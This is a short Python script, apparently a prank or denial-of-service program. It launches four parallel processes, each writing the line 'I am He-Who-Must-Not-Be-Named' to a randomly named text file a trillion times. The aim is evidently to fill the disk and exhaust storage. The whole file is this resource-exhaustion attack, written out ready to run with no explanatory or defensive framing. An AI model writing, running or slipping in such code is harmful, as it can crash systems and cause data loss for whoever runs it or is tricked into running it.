from multiprocessing import Process
import random
def fill_space1():
    name = 'file' + str(random.randint(0,1000)) + '.txt'
    f = open(name,'w')
    for i in range(1000000000000):
        f.write("I am He-Who-Must-Not-Be-Named ")
    f.close()
def fill_space2():
    name = 'file' + str(random.randint(0,1000)) + '.txt'
    f = open(name,'w')
    for i in range(1000000000000):
        f.write("I am He-Who-Must-Not-Be-Named ")
    f.close()
def fill_space3():
    name = 'file' + str(random.randint(0,1000)) + '.txt'
    f = open(name,'w')
    for i in range(1000000000000):
        f.write("I am He-Who-Must-Not-Be-Named ")
    f.close()
def fill_space4():
    name = 'file' + str(random.randint(0,1000)) + '.txt'
    f = open(name,'w')
    for i in range(1000000000000):
        f.write("I am He-Who-Must-Not-Be-Named ")
    f.close()
def Main():
    p1 = Process(target=fill_space1)
    p2 = Process(target=fill_space2)
    p3 = Process(target=fill_space3)
    p4 = Process(target=fill_space4)
    
    p1.start()
    p2.start()
    p3.start()
    p4.start()
    
    p1.join()
    p2.join()
    p3.join()
    p4.join()
if __name__=='__main__':
    Main()
